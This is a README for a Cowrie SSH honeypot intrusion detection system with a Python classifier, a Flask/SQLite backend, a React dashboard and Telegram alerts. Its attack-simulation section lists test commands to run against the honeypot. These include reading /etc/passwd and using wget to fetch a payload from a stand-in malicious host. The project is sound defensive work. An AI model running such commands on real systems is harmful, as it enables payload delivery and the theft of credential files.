# Honeypot-based Intrusion Detection System

A real-time intrusion detection system built on a Cowrie SSH honeypot. Captures attacker commands, classifies attack phases, tracks sessions, and visualizes live activity through a React dashboard — with Telegram alerts for high-risk behavior.

---

## Tech Stack

| Layer | Technology |
|---|---|
| Honeypot | Cowrie SSH, Docker |
| Detection Engine | Python |
| Backend API | Flask, SQLite |
| Dashboard | React.js |
| Alerting | Telegram Bot API |

---

## How It Works

```
Attacker connects via SSH → Cowrie honeypot captures session
         ↓
Python analyzer processes logs in real time
         ↓
Commands classified → Reconnaissance / Enumeration / Exploitation
         ↓
Session scored → multi-stage attack patterns correlated
         ↓
Flask backend stores events in SQLite
         ↓
React dashboard displays live timelines + session scores
         ↓
High-risk score → Telegram alert (cooldown prevents spam)
```

---

## Key Features

- **Real-time Log Processing** — Analyzer continuously reads Cowrie logs as attacker interacts
- **Attack Phase Classification** — Rule-based and regex-driven detection across recon, enumeration, and exploitation stages
- **Session Scoring** — Each session accumulates a risk score; threshold breach triggers alert
- **Multi-stage Detection** — Correlates command sequences to identify attack progression, not just individual commands
- **Telegram Alerting** — Cooldown logic prevents alert spam during sustained attacks
- **Persistent Storage** — SQLite stores full event history for post-session analysis
- **Live Dashboard** — React frontend displays attack timelines, session scores, and flagged commands in real time

---

## Project Structure

```
/
├── honeypot/          ← Cowrie Docker config
├── analyzer/
│   └── analyzer.py   ← Log processing + classification engine
├── backend/
│   └── app.py        ← Flask API + SQLite
├── dashboard/        ← React frontend
└── docker-compose.yml
```

---

## Run Locally

### Prerequisites
- Docker installed
- Python 3.x
- Node.js

### 1. Start honeypot

```bash
docker run -d -p 2222:2222 cowrie/cowrie
```

### 2. Start backend

```bash
cd backend
python app.py
```

### 3. Start analyzer

```bash
cd analyzer
python analyzer.py
```

### 4. Start dashboard

```bash
cd dashboard
npm install
npm start
```

---

## Simulate an Attack

Connect via SSH to trigger detection:

```bash
ssh root@<your-ip> -p 2222
# any username/password works — Cowrie accepts all
```

Run commands to trigger classification:

```bash
whoami
ls /etc
cat /etc/passwd
wget http://malicious.example.com/payload
```

---

## Alert Logic

Telegram alerts fire when:
- Session score crosses the high-risk threshold
- Attack reaches exploitation phase
- Cooldown timer prevents duplicate alerts during sustained sessions

---

## Demo Scenarios

| Scenario | Result |
|---|---|
| Attacker runs recon commands | Session score increases, phase → Reconnaissance |
| Attacker reads sensitive files | Phase escalates → Enumeration |
| Attacker runs wget / curl payload | Phase → Exploitation, Telegram alert fires |
| Second alert within cooldown window | Alert suppressed |

---

## Screenshots

| View | What to capture |
|---|---|
| Live dashboard | Active session with score + timeline |
| Telegram alert | Alert message with session summary |
| Terminal | Attacker command sequence in Cowrie |
| Session view | Multi-stage attack progression |

---

## Notes

- Cowrie accepts any SSH credential — all sessions are captured
- Detection is rule-based, not ML-based
- Honeypot runs locally; not exposed to public internet in this setup

---
